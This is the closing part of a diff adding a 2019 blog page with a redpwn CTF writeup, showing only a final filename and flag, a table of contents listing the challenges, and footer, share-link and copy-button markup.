+<p>得到最终的文件名和<code>flag</code>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">biscuits</span><br><span class="line">flag&#123;b15cu175_4r3_my_f4v0r173_k1nd_0f_c00k13&#125;</span><br></pre></td></tr></table></figure></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="https://www.yuque.com/u447199">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Cryptography"><span class="toc-number">1.</span> <span class="toc-text">Cryptography</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#superhash"><span class="toc-number">1.1.</span> <span class="toc-text">superhash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dunce-Crypto"><span class="toc-number">1.2.</span> <span class="toc-text">Dunce Crypto</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Misc"><span class="toc-number">2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#he-sed-she-sed"><span class="toc-number">2.1.</span> <span class="toc-text">he sed she sed</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#genericpyjail"><span class="toc-number">2.2.</span> <span class="toc-text">genericpyjail</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#genericpyjail2"><span class="toc-number">2.3.</span> <span class="toc-text">genericpyjail2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Tux-Trivia-Show"><span class="toc-number">2.4.</span> <span class="toc-text">Tux Trivia Show</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web"><span class="toc-number">3.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ghast"><span class="toc-number">3.1.</span> <span class="toc-text">ghast</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bluePrint"><span class="toc-number">3.2.</span> <span class="toc-text">bluePrint</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#red-pwn-is"><span class="toc-number">3.3.</span> <span class="toc-text">red-pwn-is</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cookie-Recipes"><span class="toc-number">3.4.</span> <span class="toc-text">Cookie Recipes</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://sy-yunyi.github.io/2019/09/12/redpwn-writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://sy-yunyi.github.io/2019/09/12/redpwn-writeup/&text=redpwn writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://sy-yunyi.github.io/2019/09/12/redpwn-writeup/&title=redpwn writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://sy-yunyi.github.io/2019/09/12/redpwn-writeup/&is_video=false&description=redpwn writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=redpwn writeup&body=Check out this article: https://sy-yunyi.github.io/2019/09/12/redpwn-writeup/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://sy-yunyi.github.io/2019/09/12/redpwn-writeup/&title=redpwn writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://sy-yunyi.github.io/2019/09/12/redpwn-writeup/&title=redpwn writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://sy-yunyi.github.io/2019/09/12/redpwn-writeup/&title=redpwn writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://sy-yunyi.github.io/2019/09/12/redpwn-writeup/&title=redpwn writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://sy-yunyi.github.io/2019/09/12/redpwn-writeup/&name=redpwn writeup&description=&lt;p&gt;redpwn writeup&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://sy-yunyi.github.io/2019/09/12/redpwn-writeup/&t=redpwn writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 Six
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="https://www.yuque.com/u447199">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<!-- clipboard -->
+
+  <script src="/lib/clipboard/clipboard.min.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
